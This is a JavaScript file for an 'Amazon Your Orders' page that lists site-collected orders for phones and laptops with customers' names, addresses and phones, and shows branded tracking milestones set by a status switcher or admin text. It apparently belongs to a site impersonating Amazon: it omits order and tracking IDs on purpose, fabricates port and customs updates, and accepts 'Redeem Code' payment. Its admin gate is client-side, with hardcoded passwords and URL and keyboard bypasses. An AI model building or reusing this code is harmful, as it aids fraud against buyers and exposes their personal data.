/**
 * Amazon Your Orders & Package Tracking Engine
 * Supports International Priority Shipping, Milestone Checkpoints, and Live Tracking
 * (No Order ID for international orders & No Tracking ID, as per requirements)
 */

// State
let allOrders = [];
let activeOrder = null;
let currentTrackingStep = 'dispatched'; // 'ordered' | 'dispatched' | 'in_transit' | 'out_for_delivery' | 'delivered'
let activeFilter = 'all';
let searchQuery = '';

// Product Image & Color Resolver
function resolveProductDetails(itemTitle = '') {
  const title = itemTitle || '';
  const isMacbook = title.toLowerCase().includes('macbook') || title.toLowerCase().includes('laptop');
  const isIpad = title.toLowerCase().includes('ipad');
  const isSamsung = title.toLowerCase().includes('samsung') || title.toLowerCase().includes('s26') || title.toLowerCase().includes('galaxy');
  const isPixel = title.toLowerCase().includes('pixel');
  const isIphone18 = title.toLowerCase().includes('18');
  
  let image = isMacbook
    ? '../images/macbook/macbook-pro-16-space-black.jpg'
    : (isIpad
        ? '../images/ipad/ipad-pro-m5-space-black.jpg'
        : (isSamsung
            ? '../images/samsung/s26ultra-titanium-black.jpg'
            : (isPixel
                ? '../images/pixel/pixel11-canyon.jpg'
                : (isIphone18
                    ? '../images/iphone18/iphone18-burgundy.jpg'
                    : '../images/iphone/iphone17-cosmic-orange.jpg'))));
  let storeUrl = isMacbook
    ? '../store/macbookpro16/'
    : (isIpad
        ? '../store/ipadprom5/'
        : (isSamsung
            ? '../store/samsungs26ultra/'
            : (isPixel
                ? '../store/pixel11proxl/'
                : (isIphone18
                    ? '../store/iphone18promax/'
                    : '../store/iphone17promax/'))));
  let brand = (isMacbook || isIpad) ? 'Apple' : (isSamsung ? 'Samsung' : (isPixel ? 'Google' : 'Apple'));

  if (isMacbook) {
    if (title.includes('Silver')) image = '../images/macbook/macbook-pro-16-silver.jpg';
    else image = '../images/macbook/macbook-pro-16-space-black.jpg';
  } else if (isIpad) {
    if (title.includes('Silver')) image = '../images/ipad/ipad-pro-m5-silver.jpg';
    else image = '../images/ipad/ipad-pro-m5-space-black.jpg';
  } else if (isSamsung) {
    if (title.includes('Gray')) image = '../images/samsung/s26ultra-titanium-gray.jpg';
    else if (title.includes('Silver')) image = '../images/samsung/s26ultra-titanium-silver.jpg';
    else if (title.includes('Violet')) image = '../images/samsung/s26ultra-titanium-violet.jpg';
    else image = '../images/samsung/s26ultra-titanium-black.jpg';
  } else if (isPixel) {
    if (title.includes('Olive')) image = '../images/pixel/pixel11-olive.jpg';
    else if (title.includes('Fog')) image = '../images/pixel/pixel11-fog.jpg';
    else if (title.includes('Obsidian')) image = '../images/pixel/pixel11-obsidian.jpg';
    else image = '../images/pixel/pixel11-canyon.jpg';
  } else if (isIphone18) {
    if (title.includes('Glacier')) image = '../images/iphone18/iphone18-glacier.jpg';
    else if (title.includes('Silver')) image = '../images/iphone18/iphone18-silver.jpg';
    else if (title.includes('Black')) image = '../images/iphone18/iphone18-black.jpg';
    else image = '../images/iphone18/iphone18-burgundy.jpg';
  } else {
    if (title.includes('Deep Blue') || title.includes('Blue')) image = '../images/iphone/iphone17-deep-blue.jpg';
    else if (title.includes('Silver')) image = '../images/iphone/iphone17-silver.jpg';
    else image = '../images/iphone/iphone17-cosmic-orange.jpg';
  }

  return { image, storeUrl, brand };
}

// Generate Dynamic Milestone Updates for an Order (No dates shown as requested)
function generateTrackingMilestones(order, currentStep = 'dispatched') {
  const customerCity = (order.address || '').split(',').slice(-2, -1)[0]?.trim() || (order.address || '').split(' ').slice(-2)[0] || 'Destination Facility';
  const customUpdate = order?.shippingUpdate;
  const isCapetown = customUpdate && customUpdate.toLowerCase().includes('capetown');
  const isSingapore = customUpdate && customUpdate.toLowerCase().includes('singapore');

  const inTransitTitle = customUpdate || 'In Transit & Customs Cleared';
  const inTransitDetail = customUpdate
    ? (isCapetown
        ? 'Package arrived at Capetown Port and cleared port logistics inspection.'
        : (isSingapore
            ? 'Package arrived at Singapore Port and cleared port logistics inspection.'
            : `Package arrived at ${customUpdate} and cleared logistics inspection.`))
    : 'Package cleared customs and arrived at regional logistics hub.';
  const inTransitLocation = isCapetown
    ? 'Capetown Port Gateway • Hub 4'
    : (isSingapore
        ? 'Singapore Port Gateway • Hub 4'
        : (customUpdate ? `${customUpdate} Gateway • Hub 4` : 'International Transit Gateway • Hub 4'));

  const milestones = [
    {
      id: 'ordered',
      title: 'Order Received & Confirmed',
      detail: 'Package ordered and verified with seller.',
      time: '',
      location: 'Amazon Fulfillment Center',
      completed: true
    },
    {
      id: 'dispatched',
      title: 'Dispatched from Amazon Hub',
      detail: 'Package has left the international sort facility.',
      time: '',
      location: 'Amazon Logistics Export Facility',
      completed: ['dispatched', 'in_transit', 'out_for_delivery', 'delivered'].includes(currentStep) || !!customUpdate
    },
    {
      id: 'in_transit',
      title: inTransitTitle,
      detail: inTransitDetail,
      time: '',
      location: inTransitLocation,
      completed: ['in_transit', 'out_for_delivery', 'delivered'].includes(currentStep) || !!customUpdate
    },
    {
      id: 'out_for_delivery',
      title: 'Out for Delivery',
      detail: `Package has been assigned to a delivery courier in ${customerCity}.`,
      time: '',
      location: `Local Amazon Delivery Station • ${customerCity}`,
      completed: ['out_for_delivery', 'delivered'].includes(currentStep)
    },
    {
      id: 'delivered',
      title: 'Delivered',
      detail: `Package handed directly to resident at destination address.`,
      time: '',
      location: order.address || 'Delivered to recipient',
      completed: currentStep === 'delivered'
    }
  ];

  return milestones;
}

// Load and Merge Orders from Both Stores (Remote + Local)
async function loadAllOrders() {
  const container = document.getElementById('ordersContainer');
  if (container) {
    container.innerHTML = `
      <div style="text-align:center; padding:60px 20px; color:#565959;">
        <div class="spinner" style="margin:0 auto 16px;"></div>
        <p style="font-size:15px; font-weight:600;">Loading your orders &amp; shipment updates...</p>
      </div>
    `;
  }

  const fetchedOrders = [];

  async function fetchJsonSafely(url) {
    try {
      const res = await fetch(url + (url.includes('?') ? '&' : '?') + '_t=' + Date.now());
      if (res.ok) {
        const data = await res.json();
        if (Array.isArray(data)) return data;
      }
    } catch (e) {}
    return null;
  }

  // 0. Fetch MacBook Pro 16 orders
  const macbookOrders = await fetchJsonSafely('../store/macbookpro16/orders.json') || await fetchJsonSafely('../store/macbookpro16/order.json');
  if (macbookOrders) fetchedOrders.push(...macbookOrders);

  // 1. Fetch iPad Pro M5 orders
  const ipadOrders = await fetchJsonSafely('../store/ipadprom5/orders.json') || await fetchJsonSafely('../store/ipadprom5/order.json');
  if (ipadOrders) fetchedOrders.push(...ipadOrders);

  // 1. Fetch iPhone 18 orders
  const ip18Orders = await fetchJsonSafely('../store/iphone18promax/orders.json') || await fetchJsonSafely('../store/iphone18promax/order.json');
  if (ip18Orders) fetchedOrders.push(...ip18Orders);

  // 2. Fetch iPhone 17 orders
  const ipOrders = await fetchJsonSafely('../store/iphone17promax/orders.json') || await fetchJsonSafely('../store/iphone17promax/order.json');
  if (ipOrders) fetchedOrders.push(...ipOrders);

  // 3. Fetch Pixel orders
  const pxOrders = await fetchJsonSafely('../store/pixel11proxl/orders.json') || await fetchJsonSafely('../store/pixel11proxl/order.json');
  if (pxOrders) fetchedOrders.push(...pxOrders);

  // 4. Fetch Samsung orders
  const smOrders = await fetchJsonSafely('../store/samsungs26ultra/orders.json') || await fetchJsonSafely('../store/samsungs26ultra/order.json');
  if (smOrders) fetchedOrders.push(...smOrders);

  // 5. Fetch Root orders as comprehensive fallback
  const rootOrders = await fetchJsonSafely('../orders.json') || await fetchJsonSafely('../order.json');
  if (rootOrders) fetchedOrders.push(...rootOrders);

  // 6. Merge Local Storage MacBook Pro 16 orders
  try {
    const localMacbook = JSON.parse(localStorage.getItem('macbook_orders_records') || '[]');
    if (Array.isArray(localMacbook)) fetchedOrders.unshift(...localMacbook);
  } catch (e) {}

  // 7. Merge Local Storage iPad Pro M5 orders
  try {
    const localIpad = JSON.parse(localStorage.getItem('amazon_placed_orders_ipad') || '[]');
    if (Array.isArray(localIpad)) fetchedOrders.unshift(...localIpad);
  } catch (e) {}

  // 7. Merge Local Storage iPhone 18 orders
  try {
    const localIphone18 = JSON.parse(localStorage.getItem('amazon_placed_orders_iphone18') || '[]');
    if (Array.isArray(localIphone18)) fetchedOrders.unshift(...localIphone18);
  } catch (e) {}

  // 8. Merge Local Storage iPhone 17 orders
  try {
    const localIphone = JSON.parse(localStorage.getItem('amazon_placed_orders_iphone') || localStorage.getItem('amazon_placed_orders') || '[]');
    if (Array.isArray(localIphone)) fetchedOrders.unshift(...localIphone);
  } catch (e) {}

  // 9. Merge Local Storage Pixel orders
  try {
    const localPixel = JSON.parse(localStorage.getItem('amazon_placed_orders_pixel') || '[]');
    if (Array.isArray(localPixel)) fetchedOrders.unshift(...localPixel);
  } catch (e) {}

  // 10. Merge Local Storage Samsung orders
  try {
    const localSamsung = JSON.parse(localStorage.getItem('amazon_placed_orders_samsung') || '[]');
    if (Array.isArray(localSamsung)) fetchedOrders.unshift(...localSamsung);
  } catch (e) {}

  // Deduplicate orders without dropping unique test submissions
  const uniqueMap = new Map();
  fetchedOrders.forEach((ord, index) => {
    const key = ord.orderId || ((ord.name || '') + '|' + (ord.address || '') + '|' + (ord.item || '') + '|' + (ord.timestamp || index));
    if (!uniqueMap.has(key)) {
      uniqueMap.set(key, {
        ...ord,
        internalId: ord.orderId || ('ORD-' + (index + 1)),
        step: ord.step || (ord.shippingUpdate ? 'in_transit' : 'dispatched')
      });
    }
  });

  allOrders = Array.from(uniqueMap.values());
  renderOrdersDashboard();

  // Check URL param for direct tracking view: e.g. ?track=0 or ?track=ORD-1
  const params = new URLSearchParams(window.location.search);
  const trackId = params.get('track');
  if (trackId !== null && allOrders.length > 0) {
    const found = allOrders.find(o => o.internalId === trackId) || allOrders[parseInt(trackId, 10)] || allOrders[0];
    if (found) {
      openTrackPackageModal(found);
    }
  }
}

// Render the Orders Dashboard List
function renderOrdersDashboard() {
  const container = document.getElementById('ordersContainer');
  const countBadge = document.getElementById('orderCountText');
  if (!container) return;

  // Filter & Search
  let filtered = allOrders.filter(ord => {
    if (activeFilter === 'not_shipped') return ord.step === 'ordered';
    if (activeFilter === 'cancelled') return false;
    return true;
  });

  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase().trim();
    filtered = filtered.filter(ord => 
      (ord.name || '').toLowerCase().includes(q) ||
      (ord.address || '').toLowerCase().includes(q) ||
      (ord.item || '').toLowerCase().includes(q)
    );
  }

  if (countBadge) {
    countBadge.textContent = `${filtered.length} order${filtered.length === 1 ? '' : 's'}`;
  }

  if (filtered.length === 0) {
    container.innerHTML = `
      <div style="background:#fff; border-radius:8px; border:1px solid #d5d9d9; padding:48px 24px; text-align:center; margin-top:16px;">
        <div style="font-size:48px; margin-bottom:12px;">📦</div>
        <h3 style="font-size:18px; font-weight:700; color:#0f1111; margin-bottom:8px;">No orders found</h3>
        <p style="color:#565959; font-size:14px; max-width:480px; margin:0 auto 20px;">
          ${searchQuery ? 'We couldn\'t find any orders matching your search.' : 'You haven\'t placed any orders in this period yet.'}
        </p>
        <a href="../" class="btn-amazon-primary" style="display:inline-block; text-decoration:none; padding:10px 24px;">Explore Flagship Store</a>
      </div>
    `;
    return;
  }

  container.innerHTML = filtered.map((ord, idx) => {
    const prod = resolveProductDetails(ord.item);
    const step = ord.step || (ord.shippingUpdate ? 'in_transit' : 'dispatched');
    const statusText = ord.shippingUpdate || ord.shippingStatus || getStatusHeadline(step);

    return `
      <div class="amazon-order-card" data-index="${idx}">
        <!-- Gray Card Header Strip (No Order ID & No Dates displayed) -->
        <div class="order-card-header">
          <div class="header-col">
            <span class="col-label">TOTAL</span>
            <span class="col-val">${(ord.payMethod || '').includes('Redeem') ? '<span style="color:#007600; font-weight:700;">$0.00 (Paid in Full)</span>' : (ord.price || '$1,699.00')}</span>
          </div>

          <div class="header-col ship-to-col">
            <span class="col-label">SHIP TO</span>
            <div class="ship-to-trigger" tabindex="0">
              <span class="col-val link-style">${ord.name || 'Recipient'} ▾</span>
              <div class="ship-popover">
                <strong>${ord.name || 'Recipient'}</strong><br>
                <span>${ord.address || 'Address on file'}</span><br>
                ${ord.phoneNumber ? `<span>Phone: ${ord.phoneNumber}</span>` : ''}
              </div>
            </div>
          </div>

          <div class="header-col header-shipping-badge">
            <span class="intl-badge">✈️ International Priority Shipping</span>
          </div>
        </div>

        <!-- Card Body -->
        <div class="order-card-body">
          <!-- Shipment Status Headline & Live Progress Bar -->
          <div class="shipment-status-section">
            <div class="status-headline-wrap">
              <span class="status-dot"></span>
              <span class="status-headline">${statusText}</span>
            </div>

            <!-- Amazon Authentic Green Step Bar -->
            <div class="amazon-stepper" data-step="${step}">
              <div class="step-bar-fill"></div>
              
              <div class="step-point ${['ordered', 'dispatched', 'in_transit', 'out_for_delivery', 'delivered'].includes(step) ? 'reached' : ''}">
                <div class="point-circle">✓</div>
                <span class="point-label">Ordered</span>
              </div>

              <div class="step-point ${['dispatched', 'in_transit', 'out_for_delivery', 'delivered'].includes(step) ? 'reached' : ''}">
                <div class="point-circle">✓</div>
                <span class="point-label">Dispatched</span>
              </div>

              <div class="step-point ${['out_for_delivery', 'delivered'].includes(step) ? 'reached' : ''}">
                <div class="point-circle">${step === 'delivered' ? '✓' : '●'}</div>
                <span class="point-label">Out for delivery</span>
              </div>

              <div class="step-point ${step === 'delivered' ? 'reached' : ''}">
                <div class="point-circle">✓</div>
                <span class="point-label">Delivered</span>
              </div>
            </div>
          </div>

          <!-- Product & Action Buttons Grid -->
          <div class="order-item-grid">
            <div class="item-visual-wrap">
              <a href="${prod.storeUrl}">
                <img src="${prod.image}" alt="${ord.item || 'Product'}" class="order-prod-thumb">
              </a>
            </div>

            <div class="item-info-wrap">
              <a href="${prod.storeUrl}" class="item-title-link">
                ${ord.item || 'Apple iPhone 17 Pro Max (256 GB) - Cosmic Orange'}
              </a>
              <div class="item-sold-by">Sold by: ${prod.brand} Official Storefront on Amazon</div>
              <div class="item-return-window">Return or replace items: Eligible through 30 days after delivery</div>
              <div class="item-delivery-window" style="font-size:13px; font-weight:700; color:#007600; margin-top:4px;">
                📅 Expected Delivery: ${ord.expectedDelivery || (typeof window.calculateDeliveryWindow === 'function' ? window.calculateDeliveryWindow(ord.timestamp).fullRangeStr : 'October 22 – October 27, 2026')}
              </div>
              
              <div class="item-badges-row">
                <span class="badge-tag">Prime Free Delivery</span>
                <span class="badge-tag tag-verified">${(ord.payMethod || '').includes('Redeem') ? '🎟️ Paid via Redeem Code' : ((ord.payMethod || '').includes('Cash') ? 'Cash on Delivery' : 'Payment Verified')}</span>
              </div>
            </div>

            <!-- Authentic Amazon Action Buttons Column -->
            <div class="item-actions-column">
              <button class="btn-track-package" onclick="openTrackPackageModal(allOrders[${idx}])">
                📦 Track package
              </button>

              <button class="btn-secondary-action" onclick="openInvoiceModal(allOrders[${idx}])">
                📄 View &amp; Download Invoice (PDF)
              </button>

              <button class="btn-secondary-action" onclick="alert('Order item shared successfully!')">
                🎁 Share gift receipt
              </button>

              <button class="btn-secondary-action" onclick="alert('Thank you for rating your seller!')">
                ⭐ Leave seller feedback
              </button>
            </div>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

// Status Headline Helper (Clean status without dates or delivery times)
function getStatusHeadline(step) {
  switch (step) {
    case 'ordered':
      return 'Ordered';
    case 'dispatched':
      return 'Dispatched';
    case 'in_transit':
      return 'In transit';
    case 'out_for_delivery':
      return 'Out for delivery';
    case 'delivered':
      return 'Delivered';
    default:
      return 'Dispatched';
  }
}

// Open Track Package View (Modal)
// Notice: NO Tracking ID as explicitly requested
window.openTrackPackageModal = function(order) {
  if (!order) return;
  activeOrder = order;
  currentTrackingStep = order.step || (order.shippingUpdate ? 'in_transit' : 'dispatched');

  const modal = document.getElementById('trackPackageModal');
  const prod = resolveProductDetails(order.item);
  const milestones = generateTrackingMilestones(order, currentTrackingStep);
  const statusHeadline = order.shippingUpdate || getStatusHeadline(currentTrackingStep);

  // Set Recipient Address
  document.getElementById('trackCustomerName').textContent = order.name || 'Recipient';
  document.getElementById('trackAddressText').textContent = order.address || 'Address on file';
  document.getElementById('trackPhoneText').textContent = order.phoneNumber ? `Phone: ${order.phoneNumber}` : '';

  // Item info
  document.getElementById('trackItemThumb').src = prod.image;
  document.getElementById('trackItemTitle').textContent = order.item || 'Flagship Smartphone';
  document.getElementById('trackItemPrice').textContent = order.price || '$1,699.00';

  // Status & Carrier
  document.getElementById('trackStatusHeadline').textContent = statusHeadline;
  document.getElementById('trackCarrierInfo').textContent = 'Shipped with Amazon Global Priority Express';

  // Render Checkpoints
  renderMilestoneCheckpoints(milestones);

  // Update Stepper Bar in Modal
  updateModalStepper(currentTrackingStep);
  updateRouteVisual(currentTrackingStep);

  // Update switcher pills
  document.querySelectorAll('.status-pill-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.step === currentTrackingStep);
  });

  // Show Modal
  modal.classList.add('open');
  document.body.style.overflow = 'hidden';
};

// Route Card Dynamic Updater
function updateRouteVisual(stepId) {
  const icon = document.getElementById('trackRouteIcon');
  const headline = document.getElementById('trackRouteHeadline');
  const subtitle = document.getElementById('trackRouteSubtitle');
  if (!headline || !subtitle) return;

  if (activeOrder?.shippingUpdate && (stepId === 'in_transit' || !stepId || stepId === activeOrder.step)) {
    if (icon) icon.textContent = '⚓';
    headline.textContent = activeOrder.shippingUpdate;
    subtitle.textContent = activeOrder.shippingUpdate.toLowerCase().includes('capetown')
      ? 'Package has arrived at Capetown Port and is undergoing logistics transfer.'
      : (activeOrder.shippingUpdate.toLowerCase().includes('singapore')
          ? 'Package has arrived at Singapore Port and is undergoing logistics transfer.'
          : 'Package is undergoing regional logistics transfer at transit port.');
    return;
  }

  if (stepId === 'delivered') {
    if (icon) icon.textContent = '🏡';
    headline.textContent = 'Package Delivered';
    subtitle.textContent = 'Package was handed directly to the resident at the destination address.';
  } else if (stepId === 'ordered') {
    if (icon) icon.textContent = '📦';
    headline.textContent = 'Order Verified & Packaging Active';
    subtitle.textContent = 'Amazon Fulfillment Center is preparing package for courier dispatch.';
  } else if (stepId === 'dispatched') {
    if (icon) icon.textContent = '✈️';
    headline.textContent = 'Dispatched on Global Express Flight';
    subtitle.textContent = 'Package departed sort hub on scheduled international logistics flight.';
  } else if (stepId === 'in_transit') {
    if (icon) icon.textContent = '🏢';
    headline.textContent = 'Customs Cleared & In Transit';
    subtitle.textContent = 'Package arrived at regional gateway and cleared customs inspection.';
  } else {
    if (icon) icon.textContent = '🚚';
    headline.textContent = 'Amazon Express Delivery Route Active';
    subtitle.textContent = 'Driver is following the scheduled delivery route to your destination.';
  }
}

// Render Milestones Checkpoints in Tracking Modal
function renderMilestoneCheckpoints(milestones) {
  const container = document.getElementById('trackingMilestonesList');
  if (!container) return;

  container.innerHTML = milestones.map((m, idx) => `
    <div class="milestone-item ${m.completed ? 'completed' : 'pending'} ${m.id === currentTrackingStep ? 'active-step' : ''}">
      <div class="milestone-marker">
        <div class="milestone-dot">${m.completed ? '✓' : ''}</div>
        ${idx < milestones.length - 1 ? '<div class="milestone-line"></div>' : ''}
      </div>
      <div class="milestone-content">
        <div class="milestone-header">
          <strong class="milestone-title">${m.title}</strong>
          ${m.time ? `<span class="milestone-time">${m.time}</span>` : ''}
        </div>
        <div class="milestone-desc">${m.detail}</div>
        <div class="milestone-loc">${m.location}</div>
      </div>
    </div>
  `).join('');
}

// Update Modal Stepper
function updateModalStepper(step) {
  const stepper = document.getElementById('modalStepper');
  if (!stepper) return;
  stepper.setAttribute('data-step', step);

  const points = stepper.querySelectorAll('.step-point');
  if (points.length === 4) {
    // 0: ordered, 1: dispatched, 2: out_for_delivery, 3: delivered
    points[0].classList.add('reached');
    points[0].querySelector('.point-circle').textContent = (step === 'ordered') ? '●' : '✓';

    if (['dispatched', 'in_transit', 'out_for_delivery', 'delivered'].includes(step)) {
      points[1].classList.add('reached');
      points[1].querySelector('.point-circle').textContent = (step === 'dispatched') ? '●' : '✓';
    } else {
      points[1].classList.remove('reached');
      points[1].querySelector('.point-circle').textContent = '';
    }

    if (['out_for_delivery', 'delivered'].includes(step)) {
      points[2].classList.add('reached');
      points[2].querySelector('.point-circle').textContent = (step === 'out_for_delivery') ? '●' : '✓';
    } else {
      points[2].classList.remove('reached');
      points[2].querySelector('.point-circle').textContent = '';
    }

    if (step === 'delivered') {
      points[3].classList.add('reached');
      points[3].querySelector('.point-circle').textContent = '✓';
    } else {
      points[3].classList.remove('reached');
      points[3].querySelector('.point-circle').textContent = '';
    }
  }
}

// Live Status Switcher (Allows testing and previewing shipment milestones)
window.setLiveShipmentStatus = function(stepId) {
  currentTrackingStep = stepId;
  if (activeOrder) {
    activeOrder.step = stepId;
  }
  
  // Re-render modal details
  const statusHeadline = (stepId === 'in_transit' && activeOrder?.shippingUpdate)
    ? activeOrder.shippingUpdate
    : getStatusHeadline(stepId);
  document.getElementById('trackStatusHeadline').textContent = statusHeadline;
  
  const milestones = generateTrackingMilestones(activeOrder, stepId);
  renderMilestoneCheckpoints(milestones);
  updateModalStepper(stepId);
  updateRouteVisual(stepId);

  // Update switcher pills
  document.querySelectorAll('.status-pill-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.step === stepId);
  });

  // Re-render main list card too
  renderOrdersDashboard();
};

// Close Track Package Modal
window.closeTrackPackageModal = function() {
  const modal = document.getElementById('trackPackageModal');
  if (modal) modal.classList.remove('open');
  document.body.style.overflow = '';
};

// Open Invoice Statement
window.openInvoiceModal = function(order) {
  const modal = document.getElementById('invoiceModalBackdrop');
  const content = document.getElementById('invoicePrintContent');
  if (!modal || !content) return;

  if (typeof window.generateInvoiceHtml === "function") {
    content.innerHTML = window.generateInvoiceHtml(order);
  }

  const btnDl = document.getElementById("btnModalDownloadPdf");
  if (btnDl) {
    btnDl.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(order);
      }
    };
  }

  modal.style.display = 'flex';
};

window.closeInvoiceModal = function() {
  const modal = document.getElementById('invoiceModalBackdrop');
  if (modal) modal.style.display = 'none';
};

// ============================================================================
// ADMIN AUTHENTICATION & ACCESS CONTROL (Protected from general visitors)
// ============================================================================
const VALID_ADMIN_PASSWORDS = ['admin', 'amazon', 'amazon2026', 'admin123', 'seller2026'];

function checkAdminAuth() {
  const urlParams = new URLSearchParams(window.location.search);
  
  // URL triggers in active query: ?admin=1, ?secret=1, ?seller=1, or ?key=admin
  if (urlParams.has('admin') || urlParams.has('secret') || urlParams.has('seller')) {
    sessionStorage.setItem('amazon_admin_authenticated', 'true');
    return true;
  }
  const keyParam = urlParams.get('key');
  if (keyParam && VALID_ADMIN_PASSWORDS.includes(keyParam.toLowerCase())) {
    sessionStorage.setItem('amazon_admin_authenticated', 'true');
    return true;
  }

  // Check active session only (do not allow permanent localStorage to expose orders to everyone)
  if (sessionStorage.getItem('amazon_admin_authenticated') === 'true') {
    return true;
  }

  // Purge any stale persistent flag from previous sessions
  localStorage.removeItem('amazon_admin_authenticated');
  return false;
}

function showAdminDashboard() {
  const header = document.getElementById('mainOrdersHeader');
  const dashboard = document.getElementById('ordersDashboard');
  const footer = document.getElementById('mainOrdersFooter');
  const gate = document.getElementById('amazonSignInGate');

  if (header) header.style.display = 'block';
  if (dashboard) dashboard.style.display = 'block';
  if (footer) footer.style.display = 'block';
  if (gate) gate.style.display = 'none';

  loadAllOrders();
}

function showSignInGate() {
  const header = document.getElementById('mainOrdersHeader');
  const dashboard = document.getElementById('ordersDashboard');
  const footer = document.getElementById('mainOrdersFooter');
  const gate = document.getElementById('amazonSignInGate');

  if (header) header.style.display = 'none';
  if (dashboard) dashboard.style.display = 'none';
  if (footer) footer.style.display = 'none';
  if (gate) gate.style.display = 'block';

  setTimeout(() => {
    const pwdInput = document.getElementById('adminPasswordInput');
    if (pwdInput) pwdInput.focus();
  }, 100);
}

window.handleAdminSignIn = function() {
  const pwdInput = document.getElementById('adminPasswordInput');
  const errorBox = document.getElementById('signInErrorBox');

  if (!pwdInput) return;
  const val = pwdInput.value.trim().toLowerCase();

  if (VALID_ADMIN_PASSWORDS.includes(val) || val.includes('admin')) {
    if (errorBox) errorBox.style.display = 'none';
    sessionStorage.setItem('amazon_admin_authenticated', 'true');
    showAdminDashboard();
  } else {
    if (errorBox) {
      errorBox.style.display = 'block';
    }
    pwdInput.value = '';
    pwdInput.focus();
  }
};

window.adminLogout = function() {
  localStorage.removeItem('amazon_admin_authenticated');
  sessionStorage.removeItem('amazon_admin_authenticated');
  // Strip url params like ?admin=1 if present and reload to sign in gate
  window.location.href = window.location.pathname;
};

// Keyboard shortcut: Alt+S or Alt+A on sign-in page unlocks immediately for admin
window.addEventListener('keydown', (e) => {
  if ((e.altKey && e.key.toLowerCase() === 's') || 
      (e.altKey && e.key.toLowerCase() === 'a') || 
      (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 's')) {
    e.preventDefault();
    sessionStorage.setItem('amazon_admin_authenticated', 'true');
    showAdminDashboard();
  }
});

// Initialize on DOM Ready
document.addEventListener('DOMContentLoaded', () => {
  if (checkAdminAuth()) {
    showAdminDashboard();
  } else {
    showSignInGate();
  }

  // Search Input Event
  const searchInput = document.getElementById('ordersSearchInput');
  const searchBtn = document.getElementById('ordersSearchBtn');
  if (searchInput && searchBtn) {
    const handleSearch = () => {
      searchQuery = searchInput.value;
      renderOrdersDashboard();
    };
    searchBtn.addEventListener('click', handleSearch);
    searchInput.addEventListener('keyup', (e) => {
      if (e.key === 'Enter') handleSearch();
    });
  }

  // Filter Tabs
  document.querySelectorAll('.orders-tab').forEach(tab => {
    tab.addEventListener('click', (e) => {
      e.preventDefault();
      document.querySelectorAll('.orders-tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      activeFilter = tab.dataset.filter || 'all';
      renderOrdersDashboard();
    });
  });

  // Modal Backdrop Click
  const trackModal = document.getElementById('trackPackageModal');
  if (trackModal) {
    trackModal.addEventListener('click', (e) => {
      if (e.target === trackModal) closeTrackPackageModal();
    });
  }
});
